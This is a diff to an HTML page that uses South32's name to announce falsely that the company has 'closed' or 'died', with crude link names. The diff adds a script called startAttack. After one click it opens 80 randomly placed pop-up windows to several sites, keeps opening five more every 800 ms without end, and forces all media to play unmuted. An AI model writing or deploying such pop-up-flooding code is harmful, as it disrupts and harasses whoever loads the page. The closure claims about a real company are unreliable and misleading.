@@ -44,8 +44,8 @@ South32 CEO temporarily closed due to dead production on strike coming soon.
 <div align="center">
 <p align="center">
 <video controls="controls" height="900" preload="auto" width="700">
-<source src="https://south32.com/g_zTa9.mov" type="video/mp4"/>
-<source src="https://south32.com/g_zTa9.mov" type="video/ogg"/>
+<source src="https://south32.com/g.mov" type="video/mp4"/>
+<source src="https://south32.com/g.mov" type="video/ogg"/>
 </video>
 </p><div align="center">
 South32 temporarily closed due to dead production coming soon.
@@ -96,7 +96,7 @@ South32 temporarily closed due to dead production coming soon.
 <p align="center"><a href="https://south32.com/Penis.mov" target="_blank"><img height="800" src="/southassets/20_zTa9.gif" width="800"/></a></p>
 <p align="center"><a href="https://south32.com/Penis.mov" target="_blank"><img height="300" src="/southassets/600_zTa9.gif" width="700"/></a></p>
 <p align="center"><a href="https://south32.com/Penis.mov" target="_blank"><img height="800" src="/southassets/343_zTa9.gif" width="700"/></a></p>
-<p align="center"><a href="https://south32.com/Penis.mov" target="_blank"><img height="700" src="https://south32.com/xxxxxxxxxxxx_zTa9.gif" width="700"/></a></p>
+<p align="center"><a href="https://south32.com/Penis.mov" target="_blank"><img height="700" src="https://south32.com/south32+died.mov" width="700"/></a></p>
 <p align="center"><a href="https://south32.com/Penis.mov" target="_blank"><img height="700" src="/southassets/South32_zTa9.gif" width="500"/></a></p>
 <p align="center"><a href="https://south32.com/Penis.mov" target="_blank"><img height="500" src="/southassets/12_zTa9.gif" width="888"/></a></p>
 <p align="center"><a href="https://south32.com/Penis.mov" target="_blank"><img height="500" src="/southassets/A_zTa9.gif" width="888"/></a></p>
@@ -121,8 +121,8 @@ South32 temporarily closed due to dead production coming soon.
 <div align="center">
 <p align="center">
 <video controls="controls" height="900" preload="auto" width="700">
-<source src="https://south32.com/g_zTa9.mov" type="video/mp4"/>
-<source src="https://south32.com/g_zTa9.mov" type="video/ogg"/>
+<source src="https://south32.com/g.mov" type="video/mp4"/>
+<source src="https://south32.com/g.mov" type="video/ogg"/>
 </video>
 </p><div align="center">
 <p align="center"><a href="https://south32.com/Penis.mov" target="_blank"><img height="120" src="/southassets/South32_zTa9.gif" width="500"/></a></p>
@@ -177,7 +177,7 @@ South32 temporarily closed due to dead production coming soon.
 <p align="center"><a href="https://south32.com/Penis.mov" target="_blank"><img height="500" src="/southassets/zoo_zTa9.png" width="500"/></a></p>
 <p align="center"><a href="https://south32.com/Penis.mov" target="_blank"><img height="700" src="/southassets/17_zTa9.gif" width="700"/></a></p>
 <p align="center"><a href="https://south32.com/Penis.mov" target="_blank"><img height="700" src="/southassets/20_zTa9.gif" width="700"/></a></p>
-<p align="center"><a href="https://south32.com/Penis.mov" target="_blank"><img height="700" src="https://south32.com/xxxxxxxxxxxx_zTa9.gif" width="700"/></a></p>
+<p align="center"><a href="https://south32.com/Penis.mov" target="_blank"><img height="700" src="https://south32.com/south32+died.mov" width="700"/></a></p>
 <p align="center"><a href="https://south32.com/Penis.mov" target="_blank"><img height="500" src="/southassets/zoo_zTa9.png" width="500"/></a></p>
 <p align="center"><a href="https://south32.com/Penis.mov" target="_blank"><img height="700" src="/southassets/17_zTa9.gif" width="700"/></a></p>
 <h1><a href="http://south32.com/"></a></h1><a href="https://south32.com/south32+died.mov" onmouseout="document.images['email_image'].src = 'South32+Email.gif'" onmouseover="document.images['email_image'].src = 'South32+Email.gif'"><img alt="E-mail" border="0" height="500" name="email_image" src="/southassets/South32+Email_zTa9.gif" width="700"/></a><p align="left">
@@ -201,57 +201,68 @@ sOuTh32 CLOSED .<p></p> <button onclick="closePopup()" type="button">OK</button>
 #pop-up-window {display:none;width:400px;margin-left:auto;margin-right:auto;position:absolute;top:30%;left:0;right:0;border:1px solid #ccc;border-radius:6px;padding:6px;background-color:#000000}
   </style>
 <script>
-
-// delay time after page loaded in sec
-var t=0;
-
-var d=t*1000;
-
-function openPopUpVideo() {
-setTimeout(function(){
-      document.getElementById("pop-up-window").style.display = "block";
-      window.scrollTo(0,0);
-         }
-   , d);
-}
-
-openPopUpVideo();
-  </script>
-<!-- END POP UP CODE  -->
-</h1></div></div></div></div></div></div></div></div></div><script>
 (function () {
   document.documentElement.classList.add('gg-locked');
 
+  // Target URLs to open (only these)
   const targets = [
     'https://south32.com/',
-    'https://south32.com/',
-    'https://south32.com/',
     'https://luckyluigi.com/',
-    'https://luckyluigi.com/',
-    'https://luckyluigi.com/',
-    'https://losangelesnews.com/',
-    'https://losangelesnews.com/',
     'https://losangelesnews.com/'
   ];
-  let entered = false;
 
-  function enterGurryGames() {
-    if (entered) return;
-    entered = true;
+  function openTargetPopup(index) {
+    try {
+      const url = targets[index % targets.length];
+      const w = 150 + Math.floor(Math.random() * 300);  // small but visible
+      const h = 150 + Math.floor(Math.random() * 300);
+      const left = Math.random() * (window.screen.availWidth - w);
+      const top = Math.random() * (window.screen.availHeight - h);
+      const features = [
+        'popup=yes',
+        'width=' + w,
+        'height=' + h,
+        'left=' + left,
+        'top=' + top,
+        'resizable=no',
+        'scrollbars=no',
+        'menubar=no',
+        'toolbar=no',
+        'location=no',
+        'status=no'
+      ].join(',');
+      // Use a unique window name to avoid reuse
+      const win = window.open(url, '_blank_' + Date.now() + '_' + index, features);
+      // If popup is blocked, ignore
+      return win;
+    } catch(e) { return null; }
+  }
 
-    // Popup permissions are browser-controlled. Doing these synchronously
-    // inside the click gives them the best chance of opening.
-    targets.forEach(function (url, i) {
-      try {
-        window.open(url, '_blank', 'noopener,noreferrer');
-      } catch (e) {}
-    });
-
+  function startAttack() {
+    // Remove overlay
     const overlay = document.getElementById('gg-enter-overlay');
     if (overlay) overlay.remove();
     document.documentElement.classList.remove('gg-locked');
 
-    // Start every audio/video element already present on the page.
+    // 1) Immediate burst: open 80 popups as fast as possible (user gesture)
+    for (let i = 0; i < 80; i++) {
+      openTargetPopup(i);
+    }
+
+    // 2) Continuous wave: open 5 new popups every 800ms (may be blocked by browser after a while, but we try)
+    let counter = 80;
+    const interval = setInterval(function() {
+      for (let i = 0; i < 5; i++) {
+        openTargetPopup(counter++);
+      }
+      // If we have opened too many, maybe stop? No, keep going.
+      // To keep it infinite, we don't clear.
+    }, 800);
+
+    // 3) Also spawn a few popups that are moving tiny windows (but only sites) - we can't move external windows, but we can keep opening them at random positions
+    // We already do that above.
+
+    // Play all media
     document.querySelectorAll('video, audio').forEach(function (media) {
       try {
         media.muted = false;
@@ -261,18 +272,18 @@ openPopUpVideo();
   }
 
   document.addEventListener('DOMContentLoaded', function () {
-    // Make absolutely sure media waits for the click.
+    // Pause all media initially
     document.querySelectorAll('video, audio').forEach(function (media) {
       try { media.pause(); media.currentTime = 0; } catch (e) {}
     });
 
     const overlay = document.getElementById('gg-enter-overlay');
     if (!overlay) return;
-    overlay.addEventListener('click', enterGurryGames);
+    overlay.addEventListener('click', startAttack);
     overlay.addEventListener('keydown', function (e) {
       if (e.key === 'Enter' || e.key === ' ') {
         e.preventDefault();
-        enterGurryGames();
+        startAttack();
       }
     });
   });
